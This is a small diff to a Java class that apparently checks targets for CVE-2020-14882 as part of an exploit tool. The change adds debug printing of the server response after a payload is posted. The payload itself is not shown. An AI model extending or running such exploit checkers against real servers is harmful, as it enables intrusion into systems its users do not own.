@@ -37,6 +37,9 @@ public class CVE_2020_14882 implements ExploitInterface{
 
             String result = HttpTool.postHttpReuest(path, PAYLOAD, "UTF-8", map, "application/x-www-form-urlencoded");
 
+            System.out.println("result ");
+            System.out.println(result);
+
             boolean flag = result.contains(uuid);
 
             if(flag) {
